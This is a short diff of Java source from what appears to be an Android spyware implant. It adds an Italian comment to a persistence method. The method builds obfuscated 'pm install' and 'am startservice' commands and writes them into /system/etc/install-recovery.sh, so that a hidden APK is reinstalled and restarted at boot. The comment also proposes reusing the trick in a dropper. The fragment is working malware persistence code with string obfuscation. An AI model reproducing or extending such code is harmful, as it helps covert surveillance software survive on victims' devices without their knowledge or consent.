@@ -70,6 +70,12 @@ public class Persistence {
 		Execute.execute(Configuration.shellFile + " " + "fhc" + " " + pkgPath + " " + storageDir + "/" + getName());
 	}
 	
+	/**
+	 * Crea script, che installa l'apk e lo esegue
+	 * Viene copiato in /system/etc/install-recovery.sh
+	 * L'apk non viene usato, e' quello in data_app, che viene copiato internamente 
+	 * TODO: se il melt si scaricasse un core, potrebbe usare questa tecnica per avere la persistence
+	 */
 	public void addPersistance() {
 		String install = M.e("/system/bin/pm install -f ") + storageDir + "/" + getName();
 		String start = M.e("/system/bin/am startservice -n ") + curPackageName + M.e("/.ServiceMain");
